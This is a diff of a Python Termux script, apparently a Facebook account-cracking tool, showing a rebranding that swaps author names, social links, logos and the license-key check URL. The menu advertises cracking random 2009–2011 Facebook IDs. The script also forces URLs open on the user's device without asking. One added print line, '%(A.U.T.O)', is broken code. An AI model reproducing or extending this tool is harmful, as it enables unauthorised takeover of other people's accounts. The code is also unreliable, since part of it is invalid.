@@ -31,7 +31,9 @@ from concurrent.futures import ThreadPoolExecutor
   
 def logo(): 
          print (""" 
-     
+╔╦╗┬┌┐┌┬ ┬┌─┐ ┬╦╔═┬ ┬┌─┐┌┐┌
+║║║││││├─┤├─┤ │╠╩╗├─┤├─┤│││
+╩ ╩┴┘└┘┴ ┴┴ ┴└┘╩ ╩┴ ┴┴ ┴┘└┘
   ───────────────────────────────────────────────────────× 
    ───────────────────────────────────────────────────────× 
  \t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr Minhaj Khan\x1b[0m\x1b[1;97m] 
@@ -39,7 +41,6 @@ def logo():
   ───────────────────────────────────────────────────────× 
   """) 
 def logo2(): 
-         #Yahan apna logo paste krna hw 
          print (""" 
 ╔╦╗┬┌┐┌┬ ┬┌─┐ ┬╦╔═┬ ┬┌─┐┌┐┌
 ║║║││││├─┤├─┤ │╠╩╗├─┤├─┤│││
@@ -49,8 +50,8 @@ def logo2():
  \t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :6\x1b[0m\x1b[1;97m] \033[1;37m  
   ───────────────────────────────────────────────────────× 
  \t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Minhaj-Khan \x1b[0m\x1b[1;97m] 
- \t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/Mr-Qureshi-xd \x1b[0m\x1b[1;97m] 
- \t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./MrQureshi-xd \x1b[0m\x1b[1;97m] 
+ \t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : Minhaj-Khan \x1b[0m\x1b[1;97m] 
+ \t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : Minhaj-Khan \x1b[0m\x1b[1;97m] 
  ───────────────────────────────────────────────────────×  
   """) 
   
@@ -65,21 +66,12 @@ os.system('termux-setup-storage')
 def helpnote(): 
          print("%s [=>] FOLLOW ME ON  FB TU KNOW ABOUT UPDATES  :)"%(G)) 
          #yahan nichy httsp sy hata kr apna github aproval link dalna 
-         subprocess.check_output(["am", "start", "https://github.com/MinhazulIslamMinhaj/MinhajKhanAp/commit/63ffca32890ce7c6a18fd54e935ac0488cc0743a"]) 
+         subprocess.check_output(["am", "start", "https://github.com/MinhazulIslamMinhaj/MinhajKhanAp.git"]) 
          #yahan apni facebook id link dalna 
          exit(" [=>] FACEBOOK :  https://www.facebook.com/profile.php?id=100088331583368") 
   
   
 def notice(): 
-  
-  
-  
-         runtxt("\n\033[0;97m  Free 2009 cloning Tool For Free Aproval Join Group ") 
-         os.system("xdg-open https://www.facebook.com/groups/447671328737321/permalink/2365540383617063/?app=fbl") 
-         runtxt("\033[0;97m Key Approval ke Lai Group Jion Krein >> %s%s"%(G,basesplit)) 
-         runtxt("\033[0;97m Key group admin ke post pe coment krein") 
-         os.system("xdg-open https://www.facebook.com/groups/447671328737321/permalink/2365540383617063/?app=fbl") 
-         subprocess.check_output(["am", "start", "https://www.facebook.com/groups/447671328737321/permalink/2365540383617063/?app=fbl"]) 
   
   
   
@@ -100,8 +92,7 @@ class Main:
                  self.cp = [] 
                  self.loop = 0 
                  try: 
-                         #yahan pr v apna github link dalna aproval wala 
-                         plr = requests.get('https://github.com/Mr-Qureshi-xd/run.txt/blob/main/run.txt').text 
+                         plr = requests.get('https://github.com/MinhazulIslamMinhaj/MinhajKhanAp/commit/63ffca32890ce7c6a18fd54e935ac0488cc0743a').text 
                          if basesplit in plr: 
                                  key = basesplit 
                                  stat = ("\033[0;97mPREMIUM") 
@@ -118,34 +109,33 @@ class Main:
                          print("\n%s [!] NO INTERNET CONNECTION..\n"%(R)) 
                          exit() 
                  os.system("clear") 
-                 #yahan logo lagana apna 
                  print (""" 
 ╔╦╗┬┌┐┌┬ ┬┌─┐ ┬╦╔═┬ ┬┌─┐┌┐┌
 ║║║││││├─┤├─┤ │╠╩╗├─┤├─┤│││
 ╩ ╩┴┘└┘┴ ┴┴ ┴└┘╩ ╩┴ ┴┴ ┴┘└┘
   ───────────────────────────────────────────────────────× 
- \t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr Minhaj Qureshi\x1b[0m\x1b[1;97m] 
+ \t\033[1;97m[\x1b[1;97m\x1b[1;41m Minhaj-Khan\x1b[0m\x1b[1;97m] 
  \t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 6\x1b[0m\x1b[1;97m] \033[1;37m  
   ───────────────────────────────────────────────────────× 
- \t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr-Qureshi \x1b[0m\x1b[1;97m] 
- \t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/Mr-Qureshi-xd \x1b[0m\x1b[1;97m] 
- \t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./MrQureshi-xd \x1b[0m\x1b[1;97m] 
+ \t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Minhaj-Khan \x1b[0m\x1b[1;97m] 
+ \t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/Minhaj-Khan \x1b[0m\x1b[1;97m] 
+ \t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./Minhaj-Khan \x1b[0m\x1b[1;97m] 
  ───────────────────────────────────────────────────────×  
      """) 
-                 print("%s [%s•%s] %sTOOL NAME : %s2009 Cloning Tool"%(G,R,G,B,G)) 
+                 print("%s [%s•%s] %sTOOL NAME   : %sMinhaj-Khan"%(G,R,G,B,G)) 
                  print("%s [%s•%s] %sVERSION   : %s6"%(G,R,G,B,G)) 
-                 print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key)) 
-                 print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat))  
+                 print("%s [%s•%s] %sYOUR KEY   : %s%s"%(A.U.T.O)) 
+                 print("%s [%s•%s] %sSTATUS   : %s"%(G,R,G,B,stat))  
                  print("───────────────────────────────────────────────────────× ") 
                  print(" \t\033[1;97m[\x1b[1;97m\x1b[1;41m SUBCRIBE MY CHANEL FIRST\x1b[0m\x1b[1;97m] \033[1;37m ") 
-                 subprocess.check_output(["am", "start", "https://youtube.com/channel/UCOo-omO_OVoU0B1109O0Z8g"]) 
+                 subprocess.check_output(["am", "start", "https://chat.whatsapp.com/ICLU1npbLZR8x61KyX5fUR"]) 
                  print("───────────────────────────────────────────────────────× ") 
                  print("%s [%s1%s]%s CRACK RANDOM FB ID 2009-11 {JUST NOW} %s(Free Trail)"%(G,R,G,Y,B)) 
-                 tanya = input("    \033[0;97m(=×>)\033[0;97m CHOOSE : ") 
+                 Akhi = input("    \033[0;97m(=×>)\033[0;97m CHOOSE : ") 
                  print("───────────────────────────────────────────────────────× ") 
-                 if tanya in ["", " "]: 
+                 if Akhi in ["", " "]: 
                          Main() 
-                 elif tanya in ["1", "01"]: 
+                 elif Akhi in ["1", "01"]: 
                          if basesplit in plr: 
                                  self.fbtua() 
                          else:  
@@ -153,7 +143,7 @@ class Main:
                                  exit() 
                  else: 
                          Main() 
- #yahan nichy kch cherna ni just name chnge krna 
+                         
          def fbtua(self): 
                  x = 11111111 
                  xx = 99999999 
@@ -377,7 +367,6 @@ class Main:
                          else: 
                                  continue 
   
-  #Minhaj copy krke apna name dal dyna 
   
                  self.loop +=1 
   
